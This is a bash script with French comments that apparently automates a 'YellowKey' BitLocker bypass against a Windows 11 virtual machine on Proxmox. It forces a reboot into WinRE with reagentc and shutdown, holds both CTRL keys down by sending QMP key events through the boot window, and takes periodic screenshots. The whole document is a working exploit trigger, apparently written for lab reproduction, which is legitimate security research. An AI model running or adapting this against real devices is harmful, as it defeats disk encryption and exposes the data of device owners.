#!/usr/bin/env bash
#
# Trigger YellowKey BitLocker bypass :
#   1. shutdown /r /o sur Win11 (reboot vers Advanced Startup / WinRE)
#   2. spam CTRL down via QMP pendant la fenetre de boot WinRE
#   3. screenshots toutes les 10s pour visualiser l'effet
#
# A executer sur le hote Proxmox via SSH (sshpass externe).

set -euo pipefail

VMID="${VMID:-121}"
DURATION="${DURATION:-90}"          # secondes de spam CTRL
INTERVAL_MS="${INTERVAL_MS:-100}"   # toutes les 100ms
SNAP_INTERVAL="${SNAP_INTERVAL:-10}" # screenshot toutes les 10s
OUTDIR="${OUTDIR:-/tmp/yk-shots}"

mkdir -p "${OUTDIR}"
rm -f "${OUTDIR}"/*.png "${OUTDIR}"/*.ppm

qmp() {
  socat - "UNIX-CONNECT:/var/run/qemu-server/${VMID}.qmp" <<EOF
{"execute":"qmp_capabilities"}
$1
EOF
}

snap() {
  local idx="$1"
  local file="${OUTDIR}/shot_$(printf '%02d' "${idx}").ppm"
  echo "screendump ${file}" | qm monitor "${VMID}" >/dev/null 2>&1
  pnmtopng "${file}" > "${file%.ppm}.png" 2>/dev/null
  rm -f "${file}"
  echo "[+] $(date +%H:%M:%S) snapshot ${idx} -> ${file%.ppm}.png"
}

ctrl_hold() {
  # Maintient CTRL gauche + droit en down. QEMU autorise key-down repete
  # sans up -- on re-emet en permanence pour survivre au reset clavier
  # apres reboot VM.
  qmp '{"execute":"input-send-event","arguments":{"events":[{"type":"key","data":{"down":true,"key":{"type":"qcode","data":"ctrl_l"}}},{"type":"key","data":{"down":true,"key":{"type":"qcode","data":"ctrl_r"}}}]}}' >/dev/null 2>&1 || true
}

ctrl_release() {
  qmp '{"execute":"input-send-event","arguments":{"events":[{"type":"key","data":{"down":false,"key":{"type":"qcode","data":"ctrl_l"}}},{"type":"key","data":{"down":false,"key":{"type":"qcode","data":"ctrl_r"}}}]}}' >/dev/null 2>&1 || true
}

echo "[*] $(date +%H:%M:%S) Snapshot initial"
snap 0

echo "[*] $(date +%H:%M:%S) Trigger : reagentc /boottore + shutdown /r"
qm guest exec "${VMID}" --timeout 15 -- reagentc.exe /boottore >/dev/null 2>&1 || true
qm guest exec "${VMID}" --timeout 15 -- shutdown.exe /r /t 0 /f >/dev/null 2>&1 || true

echo "[*] $(date +%H:%M:%S) Maintien CTRL down pendant ${DURATION}s"
start_ts=$(date +%s)
last_snap=$start_ts
snap_idx=1
end_ts=$((start_ts + DURATION))

while [[ $(date +%s) -lt ${end_ts} ]]; do
  ctrl_hold
  now=$(date +%s)
  if (( now - last_snap >= SNAP_INTERVAL )); then
    snap "${snap_idx}"
    snap_idx=$((snap_idx + 1))
    last_snap=${now}
  fi
  sleep "$(awk "BEGIN{print ${INTERVAL_MS}/1000}")"
done

echo "[*] $(date +%H:%M:%S) Release CTRL. Screenshot final."
ctrl_release
snap "${snap_idx}"

echo "[*] Resultats dans ${OUTDIR}/"
ls -la "${OUTDIR}/"
